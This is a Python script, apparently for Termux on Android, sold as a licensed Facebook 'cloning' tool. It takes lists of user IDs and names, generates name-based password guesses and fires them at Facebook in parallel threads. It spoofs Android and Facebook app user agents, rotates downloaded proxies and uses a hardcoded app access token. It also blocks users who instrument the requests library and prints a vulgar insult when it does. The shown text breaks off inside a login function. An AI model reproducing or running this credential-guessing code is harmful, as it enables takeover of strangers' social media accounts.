# =[•]=[SCRIPT]=[ADMIN]=[MD MORSHED]=[•]=
#----------------------------------------------------------------#
import os
#----------------------------------------------#
os.system('clear')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print('loading Modules ...\n')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python jihad.py')
#--------------------------proxies---------------------------#
king='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(king+'sessions.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
qeen='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(qeen+'models.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')
don='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(don+'utils.py','r').read():
    pass
else:
    exit('\033[1;32mBēśyāra chēlē mēthaḍa kyāpacāra karabā tumi tōmāra mārē kuttā diẏē cōdai')

try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(prox)
except Exception as e:
	print('')
proxies=open('proxies.txt','r').read().splitlines()

princp=[]
#-----------------------------------------------------#
usr=[]
android_models=[]
#-----------------------------------------------------#
bblack="\033[1;30m" 
M="\033[1;31m"       
H="\033[1;33m"               
byellow="\033[1;33m"     
bblue="\033[1;34m"        
P="\033[1;35m"               
C="\033[1;36m"          
B="\033[1;37m"       
G="\033[1;32m"              
R="\033[1;31m"
AA="\033[1;32m"
BB="\033[1;31m"
CC="\033[1;36m"
X='\033[1;30m'
XX="\x1b[38;5;196m"
GGG="\x1b[38;5;214m"
#-----------------------------------------------------#

  

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#-----------------------------------------------------#
model = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
gtt=random.choice(['GT-I9190','KOT49H','GT-I9192','KOT49H','GT-I9300I','KTU84P','GT-I9300','IMM76D','GT-I9300','JSS15J','GT-I9301I','KOT4','GT-I9301I','KOT49H','GT-I9500','JDQ39','GT-I9500','LRX22C','GT-N5100','JZO54K','GT-N7100','KOT49H','GT-N8000','JZO54K','GT-N8000','KOT49H','GT-P3110','JZO54K','GT-P5100','IML74K','GT-P5100','JDQ','GT-P5100','JDQ39','GT-P5100','JZO54K','GT-P5110','JDQ39','GT-P5200','KOT49H','GT-P5210','KOT49H','GT-P5220','JDQ39','GT-S7390','JZO54K','SAMSUNG','SM-A500F','SAMSUNG','SM-G532F','SAMSUNG','SM-G920F','SAMSUNG','SM-G935F','SAMSUNG','SM-J320F','SAMSUNG','SM-J510FN','SAMSUNG','SM-N920S','SAMSUNG','SM-T280','SM-A500FU','MMB29M','SM-A500F','LRX22G','SM-A500F','MMB29M','SM-A500H','MMB29M','SM-G900F','KOT49H','SM-G920F','MMB29K','SM-G920F','NRD90M','SM-G930F','NRD90M','SM-G935F','MMB29K','SM-G935F','NRD90M','SM-G950F','NRD90M','SM-J320FN','LMY47V','SM-J320F','LMY4','SM-J320F','LMY47V','SM-J320H','LMY47V','SM-J320M','LMY47V','SM-J510FN','MMB29M','SM-J510FN','NMF2','SM-J510FN','NMF26X','SM-J510FN','NMF26X;','SM-J701F','NRD90M;','SM-T111','JDQ39','SM-T230','KOT49H','SM-T231','KOT49H','SM-T235','KOT4''SM-T310','KOT49H','SM-T311','KOT4','SM-T311','KOT49H','SM-T315','JDQ39','SM-T525','KOT49H','SM-T531','KOT49H','SM-T531','LRX22G','SM-T535','LRX22G','SM-T555','LRX22G','SM-T561','KTU84P','SM-T705','LRX22G','SM-T705','LRX22G','SM-T805','LRX22G','SM*T820','NRD90M','SPH-L720','KOT49H'])
density = random.choice(['4.0','3.0','2.75'])
width = random.choice(['1080','720','1440'])
height = random.choice(['2392','1776','2560','1612','2340','2408','1600','1520'])
FBLC = random.choice(['es_ES','sl_SI','ms_MY','mk_MK','ne_NP','bn_IN'])
FBRV = '0'
FBCR = random.choice(['Telenor','Zong','Grammenphone','UFONE-PAKTel','Banglalink'])
FBMF = random.choice(['Xiaomi','Xiaomi'])
FBBD = random.choice(['Xiaomi','Xiaomi'])
FBPN = random.choice(['com.facebook.lite','com.facebook.adsmanager','com.facebook.katana','com.facebook.mlite'])
FBDV = 'Redmi Note 8T'
FBSV = str(random.randint(1,19))
FBOP = str(random.randint(1,19))
FBCA = random.choice(['x86:arm64-v8a;','x64:armeabi-v7a;'])
oppo = random.choice(['CPH1915','CPH2025','CPH1819','CPH2083','CPH1943','CPH2477'])
d25 = random.choice(['CPH2071','CPH1827','CPH2209','CPH2161','SPH2209','CPH2095','CPH2069','PEAT00','CPH2185'])
d26 = random.choice(['CPH2119','CPH2161','CPH2089','CPH1983','CPH2009','PEAM00','CPH1837','PERM00','CPH2137'])
d262 = random.choice(['CPH2451','CPH2419','CPH2389','CPH2351','CPH2332','CPH2331','CPH2261','CPH2238','CPH2107','CPH2048','CPH1929','CPH1985','CPH1869','CPH1615','CPH1664','CPH1451','CPH1235','CPH1114'])
d27 = random.choice(['22122RK93C','22041216C','2201117TY','2304FPN6DC','22101316UP','2206122SC','2106118C','21091116UI','M2105K81AC','M2101K6G','Redmi Note 10 Lite','M2003J15SC','MI CC9 Pro','2201116TG','22041216UC','21061119DG','Mi 9T','2304FPN6DG'])
d28 = random.choice(['SM-A042F','SM-M136B','SM-A042M','SM-A047F','SM-M045F'])
xa = random.choice(['MI CC9 Pro Premium Edition','Redmi Note 8 Pro','Mi Note 10','MI 8 Explorer Edition','Mi Note 10 Lite'])
d30 = random.choice(['LMK420Y','LM-V600VML','LM-K315','LM-Q725S','LM-K315','LMK525','LMQ730HA','LM-Q925S','LMX440IM','LMQ730TM','LM-G910EMW','LM-X440ZM','LM-K315IM','LM-Q520N','LM-Q610','LM-Q630N','LMK610IM','LMX440ZM'])
d31 = random.choice(['LMK520','Q710','LMV600VML','LM-X440ZM','LM-K610IM','LMK420H','LMK520, LM-K520','LM-Q610(FGN)','LMG910EMW','LM-K525'])
vivo = random.choice(['vivo 1906','vivo 1938','vivo 1601','vivo 1920','vivo 1801','vivo 1935','vivo 1724','vivo 1901'])
sony = random.choice(['XQ-BT44','XQ-AT52','XQ-BC52'])
#-----------------------------------------------------#
kkkkki = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def morshed1():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+str(kkkkki)+';FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        return ua

#-----------------------------------------------------#
vers = requests.get('https://raw.githubusercontent.com/MORSHED-404/MORSHED-404/main/version.txt').text
version = str(vers)
#-------------------------------#
#os.system('xdg-open https://www.facebook.com/profile.php?id=100079519400970')
logo = (f"""
  \x1b[38;5;46m██████  ██       █████   ██████ ██   ██ 
  \x1b[38;5;47m██   ██ ██      ██   ██ ██      ██  ██  
  \x1b[38;5;48m██████  ██      ███████ ██      █████    
  \x1b[38;5;49m██   ██ ██      ██   ██ ██      ██  ██   
  \x1b[38;5;50m██████  ███████ ██   ██  ██████ ██   ██\033[1;32m XD
{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m AUTHOR    : MD MORSHED             
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mFACEBOOK  : MD MORSHED            
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;48mGITHUB    : MORSHED-404             {version}{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
def linex():
        print(f'{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
dc = random.choice([A,B,C,D,M,H,N,E,F,G,P])
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]


try:
    os.system('clear')
    xnx = requests.get('https://raw.githubusercontent.com/MORSHED-404/MRBD/main/ON-OFF.txt').text
    if "maintenance" in xnx:
        os.system('clear')
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m MAINTENANCE BREAK RUNNING\n')
        sys.exit()
    if "OxFF" in xnx:
        print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m TOOL IS OFF NOW ')
        sys.exit()
    if "update" in xnx:
        for up in range(999):
            print(f"\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m WAIT YOUR NEXT UPDATE ")
            time.sleep(0.8)
    if "server" in xnx:
        print(f' {warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}SERVER IS OFF')
        sys.exit()
except requests.exceptions.ConnectionError:
    print(f" {warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}FIX YOUR INTERNET BRUH")
    sys.exit()


os.system('clear')   
import getpass
attemps = 0
os.system('clear')
print(logo)
os.system('xdg-open https://www.facebook.com/profile.php?id=100079519400970')
while attemps < 999999999998888888888889999999999999999999999999999:
    username = input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m PUT LICENSE : ')
  
    os.system('clear');print(logo)
    if username == 'KCGSX-SDYTL-NGGHY-GPSZI':
        print('SUCCESSFUL LICENSE')
        break
    else:
       # print('INCORRECT LICENSE ')
        attemps += 1
        continue


def menu():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid())
  id = "".join(uuid)

  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/MORSHED-404/FBBD/main/ON-OFF.txt').text    
    if id in httpCaht:
      print(f"\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m APPROVED SUCCESSFUL")
      msg = str(os.geteuid())
      time.sleep(4.9)
      menu_a()
      pass
    else:
      print(f'{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}YOUR KEY  : =['+id+']=')
      linex()
      print(f"{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}NOTE !")
      print(f"{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}THIS IS PAID TOOL [💸]")
      print(f"{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}SEND YOUR KEY ADMIN [💸]")
      linex()
      input(f'{warna} \x1b[1;97m[{warna}⍣\x1b[1;97m]\33[1;92m {warna}IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+8801976968189?text='+tks),approval()
      time.sleep(9)
      approval()
  except:
    sys.exit()
    
       

            
#---------------------------------------------------
def menu_a():
			#clear()
			#print(f"\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m LICENSE EXPIRE : 2023/10/28 - 4:20 ")
			#print(f"\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m PUT LICENSE : ")
			os.system('xdg-open https://www.facebook.com/profile.php?id=100079519400970')
			linex()
			print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m FILE CLONING')
			print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;47m RANDOM CLONING ')
			print(f"\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;48m CONTACT TOOLS ADMIN ")
			print(f'\x1b[1;92m {XX}[\x1b[1;92m4{XX}]\x1b[38;5;49m JOIN MESSENGER GROUP ')
			print(f'\x1b[1;92m {XX}[\x1b[1;92m5{XX}]\x1b[38;5;50m JOIN FACEBOOK GROUP ')
			print(f'\x1b[1;92m {XX}[\x1b[1;92m0{XX}]\x1b[38;5;51m EXIT MENU ')
			linex()
			xd=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m CHOICE MENU : ')
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FILE NAME : /sdcard/black.txt  etc..')
				linex()
				file = input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m PUT FILE NAME : ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46mFILE LOCATION NOT FOUND ')
					time.sleep(1)
					menu()
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mA{XX}]')
				print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mB{XX}]')
				linex()
				mthd=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m SELECT METHOD : ')
				linex()
				plist = []
				clear()
				try:
					ps_limit = int(input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m How many password do you want to add : '))
				except:
					ps_limit =1
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m EXP : first last:,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m Password {i+1} : '))
					linex()
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m Do You Went Show Cp Account? {R}[{G}y{R}|{H}n{R}] ')
				linex()
				cx=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m CHOICE MENU : ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m TOTAL IDS : '+total_ids+f' ')
					print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m USE APN FOR MORE OK IDZ {N}>> {G}M{mthd}')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mthd in ['1','A']:
							crack_submit.submit(api1,ids,names,passlist)
						if mthd in ['B','2']:
							crack_submit.submit(api2,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(f'\x1b[1;92m[\x1b[1;91m•\x1b[1;92m] THE PROCESS HAS COMPLETED')
				print(f'\x1b[1;92m[\x1b[1;91m•\x1b[1;92m] TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46mPRESS ENTER TO BACK ')
				os.system('python jihad.py')
			elif xd in ['2','02']:
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://www.facebook.com/profile.php?id=100079519400970');menu()
			elif xd in ['4','04']:os.system('xdg-open https://m.me/j/AbZ7dsl3M7okSBmW/');menu()
			elif xd in ['5','05']:os.system('xdg-open https://facebook.com/groups/1919451095053010/');menu()
			elif xd in ['0','00']:clear();print(f"\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m THANKS FOR USING DEAR")
			
			

def RANDOM():
			clear()
			print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mBD{XX}]')
			print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mINDIA{XX}]')
			linex()
			NB=input(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m CHOICE MENU : ')
			if NB in ['1','01']:RANDOMBD()
			if NB in ['2','02']:RANDOMIN()
				
#-----------------------------------------------------#
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bblack}[{G}BLACK-M2{bblack}]-[{G}%s{bblack}]-[{G}OK:%s{bblack}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
